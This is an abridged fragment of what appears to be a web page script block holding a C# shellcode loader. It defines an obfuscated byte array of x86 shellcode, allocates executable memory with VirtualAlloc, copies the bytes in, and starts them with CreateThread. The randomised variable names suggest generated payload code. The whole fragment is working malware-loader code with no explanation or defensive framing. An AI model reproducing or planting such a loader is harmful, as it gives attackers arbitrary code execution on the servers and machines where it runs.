...
0x31,0xff,0x8b,0x72,0x28,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,
0x10,0x57,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x50,0x8b,0x58,0x20,0x8b,0x48,0x18,0x01,0xd3,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr mgpbEzWUS3p = VirtualAlloc(IntPtr.Zero,(UIntPtr)fOMpgPK_.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(fOMpgPK_,0,mgpbEzWUS3p,fOMpgPK_.Length);
        IntPtr tkwFntQm40 = IntPtr.Zero;
        IntPtr eqeUYGuR = CreateThread(IntPtr.Zero,UIntPtr.Zero,mgpbEzWUS3p,IntPtr.Zero,0,ref tkwFntQm40);
    }
</script>
